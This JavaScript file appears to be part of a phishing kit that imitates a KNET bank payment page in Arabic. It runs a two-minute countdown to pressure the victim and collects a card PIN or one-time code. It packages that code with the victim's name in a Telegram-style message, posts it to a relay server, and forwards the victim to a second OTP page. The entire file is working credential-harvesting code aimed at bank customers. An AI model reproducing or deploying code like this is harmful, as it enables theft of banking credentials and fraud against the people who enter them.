let duration = 2 * 60;
const timerDisplay = document.getElementById('timer');

const countdown = setInterval(() => {
    const minutes = Math.floor(duration / 60);
    const seconds = duration % 60;
    timerDisplay.textContent = `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
    if (duration <= 0) {
        clearInterval(countdown);
        timerDisplay.textContent = "انتهى الوقت";
    }
    duration--;
}, 1000);

document.addEventListener("DOMContentLoaded", function () {
    const amount = localStorage.getItem("boton");
    if (amount) {
        document.getElementById("amountValu").textContent = amount;
    }

    const totalAmount = localStorage.getItem("totalAmount");
    if (totalAmount) {
        document.getElementById("amountValu").innerText = totalAmount;
    }

    document.getElementById("paymentForm").addEventListener("submit", function (e) {
        e.preventDefault();
        sendToServer();
    });
});

function sendToServer() {
    const pinInput = document.getElementById("pin");
    const pin = pinInput.value.trim();
    const name = localStorage.getItem("userName");

    if (!/^\d{5,6}$/.test(pin)) {
        alert("الرقم السري غير صالح");
        return;
    }

    const message = `
📩 <b>1 رمز كي نت</b>

<b>👤 من:</b> ${name || 'غير متوفر'}
<b>🔑 الرقم السري:</b> ${pin}`;

    // ✅ إرسال إلى الخادم المحلي
    fetch('http://localhost:3000/api/payment', {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            name: name,
            pin: pin,
            message: message,
            type: 'kpay_otp_1'
        })
    })
        .then(() => {
            window.location.href = "otp2.html";
        })
        .catch(error => {
            console.error("خطأ في الإرسال:", error);
        });
}

setTimeout(function () {
    const element = document.getElementById('namenone');
    if (element) element.style.display = 'none';

    document.body.querySelectorAll('*').forEach(function (el) {
        el.style.visibility = 'visible';
    });
}, 5000);